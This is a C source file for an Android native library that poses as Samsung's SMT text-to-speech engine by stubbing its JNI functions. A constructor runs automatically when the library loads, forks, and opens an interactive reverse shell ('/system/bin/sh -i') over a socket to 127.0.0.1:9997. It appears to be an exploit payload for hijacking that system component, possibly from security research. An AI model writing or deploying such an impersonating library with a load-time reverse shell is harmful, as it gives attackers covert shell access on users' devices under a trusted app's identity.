#include <jni.h>
#include <unistd.h>
#include <string.h>
#include <android/log.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <dirent.h>
#include <stdarg.h>
#include <sys/system_properties.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, "mercury-native", __VA_ARGS__)

char *ip = "127.0.0.1";
char *port = "9997";

JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize(JNIEnv *env, jobject thiz) {
    return -1;
}

JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_setLanguage(JNIEnv *env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
    return 1;
}

JNIEXPORT jint Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(JNIEnv *env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6) {
    return -1;
}

JNIEXPORT jint JNICALL Java_com_samsung_SMT_SmtTTS_getVersion(JNIEnv *env, jobject thiz) {
    return -1;
}

void defeated_weasel() {
    int s = socket(AF_INET, SOCK_STREAM, 0);

    /* Populate details of server */
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(atoi(port));

    /* Connect */
    if (connect(s, (struct sockaddr *) &server, sizeof(struct sockaddr)) != 0) return;

    /* Connect stdin, stdout and stderr to socket */
    dup2(s, STDIN_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDERR_FILENO);

    /* Run shell */
    system("/system/bin/sh -i");
}

__attribute__((constructor))
static void doload() {
    int pid = -1;

    LOGE("somehow I'm in the library yah, my uid is %d", getuid());
    pid = fork();

    if (pid == 0) defeated_weasel();
}
